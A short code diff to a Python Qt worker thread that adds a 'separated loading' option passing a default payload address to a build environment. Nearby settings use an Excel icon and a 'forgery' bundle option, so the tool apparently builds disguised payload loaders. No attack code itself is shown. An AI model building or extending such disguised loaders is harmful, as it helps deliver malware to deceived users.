@@ -94,6 +94,12 @@ class WorkerThread(QThread):
         
         env_vars['RSL_ICON_PATH'] = self.params.get('icon_path', 'icons/excel.ico')
         
+        # 如果选择分离式加载，设置默认payload地址
+        if self.params.get('load_payload_mode') == 'cmdline':
+            default_address = self.params.get('default_payload_address', 'payload.bin')
+            if default_address.strip():  # 确保不为空
+                env_vars['RSL_DEFAULT_PAYLOAD_ADDRESS'] = default_address
+        
         if self.params.get('forgery_enable'):
             bundle_file = self.params.get('bundle_file', '')
             if not bundle_file:
